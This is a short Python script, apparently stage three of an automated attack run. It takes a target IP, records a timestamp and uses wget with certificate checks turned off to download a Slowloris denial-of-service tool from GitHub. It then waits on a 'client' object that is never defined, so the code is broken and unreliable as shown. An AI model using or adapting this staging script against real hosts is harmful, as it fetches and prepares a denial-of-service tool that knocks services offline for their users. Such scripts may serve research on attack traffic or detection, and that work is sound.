import time
import sys
import os
import subprocess


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    time.sleep(2)
    output_time_file = 'time_stage_3_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    download_the_app = 'wget --no-check-certificate https://raw.githubusercontent.com/masjohncook/local_slowloris/master/local_slowloris.py'
    subprocess.run(download_the_app.split(), stdout=subprocess.PIPE)

    while client.jobs.list:
        time.sleep(1)

    # print(client.sessions.list['4'])




main(sys.argv)
